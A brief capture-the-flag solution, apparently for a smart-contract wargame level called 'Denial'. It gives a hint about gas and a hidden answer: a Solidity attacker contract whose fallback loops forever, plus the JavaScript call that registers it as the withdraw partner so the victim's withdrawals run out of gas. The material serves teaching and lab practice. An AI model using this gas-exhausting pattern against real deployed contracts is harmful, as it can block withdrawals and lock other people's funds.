# Denial

**HINT:** Look at the ```withdraw``` function and how it works(think gas)

<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.6.0;
contract Attack {
    
    fallback() payable external {
        while(true){
            
        }
    }
    
}
```

Then set ```.setWithdrawPartner``` as your contract address

```js
await contract.setWithdrawPartner('Your_Contract_Address')
```
</p>
</details>